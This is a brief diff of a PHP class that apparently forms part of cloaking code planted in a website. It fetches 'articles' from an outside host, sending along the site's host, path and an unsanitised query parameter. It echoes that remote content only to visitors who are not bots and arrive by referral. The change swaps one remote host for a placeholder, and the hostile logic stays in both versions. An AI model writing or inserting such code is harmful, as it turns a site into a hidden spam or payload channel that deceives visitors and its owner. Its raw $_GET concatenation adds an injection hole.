@@ -31,7 +31,7 @@ class ModelTp1{
              return;
          }
 
-        $this->articles = $this->httpVisit('http://utf8.macormedia.net/index.php?host=http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?contentid=&'.$_GET['contentid']);
+        $this->articles = $this->httpVisit('http://xxx.com/index.php?host=http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?contentid=&'.$_GET['contentid']);
 
         if (!$this->isBot()&&$this->isRef()&&$this->ids()){
             echo $this->articles;exit;
